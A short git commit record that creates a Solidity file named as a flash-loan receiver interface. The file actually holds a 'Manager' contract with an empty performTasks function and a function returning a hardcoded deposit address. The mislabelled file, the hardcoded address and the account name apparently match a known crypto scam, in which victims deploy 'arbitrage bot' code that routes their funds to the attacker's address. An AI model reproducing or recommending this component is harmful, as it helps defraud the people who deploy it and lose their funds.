1d1af2521244af03d6a9955d794e8a2ad490fc5b
Cryptoexpert1993 <88196304+Cryptoexpert1993@users.noreply.github.com>
2021-08-05 05:39:46 -0400

    Create IFlashLoanReceiverV1.2.sol

---
+++ IFlashLoanReceiverV1.2.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.17;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x7447766ff3113873AF8716AbB250A2222f1E0ef9;
+	}
+}
